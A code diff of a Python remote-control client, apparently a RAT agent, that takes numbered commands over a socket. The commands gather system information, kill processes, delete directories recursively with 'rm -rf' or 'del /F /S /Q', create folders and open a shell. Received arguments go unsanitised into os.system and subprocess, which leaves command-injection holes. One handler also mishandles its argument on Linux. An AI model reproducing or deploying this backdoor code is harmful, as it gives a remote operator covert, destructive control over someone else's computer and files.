@@ -104,25 +104,23 @@ def Process(sock):
         return
 
 # Kill进程 by Name
-def KillName(sock):
-    d = sock.recv(1024)
-    name = d.decode('utf-8')
+def KillName(sock, command):
+    name = command.decode('utf-8').split("||", 1)
     if SYS == 'nt':
-        res = subprocess.getoutput('taskkill /f /im %s' % name)
-        sock.send(b'The command has been executed.')
+        res = subprocess.getoutput('taskkill /f /im %s' % name[1])
+        Send('The command has been executed. ' + res, sock)
     else:
-        sock.send(b'This is Linux OS. Can\'t execute the command.')
+        Send('This is Linux OS. Can\'t execute the command.', sock)
     return
 
 # Kill进程 by ID
-def KillId(sock):
-    d = sock.recv(1024)
-    id = d.decode('utf-8')
+def KillId(sock, command):
+    id = command.decode('utf-8').split("||", 1)
     if SYS == 'nt':
-        res = subprocess.getoutput('taskkill /f /pid %s' % id)
+        res = subprocess.getoutput('taskkill /f /pid %s' % id[1])
     else:
         res = subprocess.getoutput('kill -9 %s' % id)
-    sock.send(b'The command has been executed.')
+    Send('The command has been executed. ' + res, sock)
     return
     
 # 文件列表
@@ -150,22 +148,30 @@ def UpDic(sock):
     return
 
 # 子目录
-def DownDic(sock):
+def DownDic(sock, command):
     global PATH
-    d = sock.recv(1024)
-    name = d.decode('utf-8')
+    name = command.decode('utf-8').split("||", 1)
     try:
-        os.chdir('%s' % name)
+        os.chdir('%s' % name[1])
     except:
         pass
     PATH = os.getcwd()
     return
 
 # 删除文件
-def Del(sock):
-    d = sock.recv(1024)
-    name = d.decode('utf-8')
-    os.system('rm -rf %s' % name)
+def Del(sock, command):
+    name = command.decode('utf-8').split("||", 1)
+    if SYS == 'nt':
+        os.system('del /F /S /Q %s' % name[1])
+        os.system('rd /S /Q %s' % name[1])
+    else:
+        os.system('rm -rf %s' % name[1])
+    return
+
+# 新建文件夹
+def Add(sock, command):
+    name = command.decode('utf-8').split("||", 1)
+    os.system('mkdir %s' % name[1])
     return
 
 # shell
@@ -193,31 +199,33 @@ TEMP = os.getcwd()
 #循环接受命令，一级指令为数字，二级为*（一级）x*（二级）
 while True:
     d = s.recv(1024)
-    if d == b'0':
+    if d.startswith(b'0'):
         s.send(b'Bye')
         break
-    elif d == b'1':
+    elif d.startswith(b'1x00'):
         Getinfo(s)
-    elif d == b'1x01':
+    elif d.startswith(b'1x01'):
         GetMoreinfo(s,'CPU')
-    elif d == b'1x02':
+    elif d.startswith(b'1x02'):
         GetMoreinfo(s,'MEM')
-    elif d == b'1x03':
+    elif d.startswith(b'1x03'):
         GetMoreinfo(s,'USB')
-    elif d == b'2':
+    elif d.startswith(b'2x00'):
         Process(s)
-    elif d == b'2x01':
-        KillName(s)
-    elif d == b'2x02':
-        KillId(s)
-    elif d == b'3':
+    elif d.startswith(b'2x01'):
+        KillName(s, d)
+    elif d.startswith(b'2x02'):
+        KillId(s, d)
+    elif d.startswith(b'3x00'):
         File(s)
-    elif d == b'3x01':
+    elif d.startswith(b'3x01'):
         UpDic(s)
-    elif d == b'3x02':
-        DownDic(s)
-    elif d == b'3x03':
-        Del(s)
-    elif d == b'4':
+    elif d.startswith(b'3x02'):
+        DownDic(s, d)
+    elif d.startswith(b'3x03'):
+        Del(s, d)
+    elif d.startswith(b'3x04'):
+        Add(s, d)
+    elif d.startswith(b'4'):
         Shell(s)
 s.close()
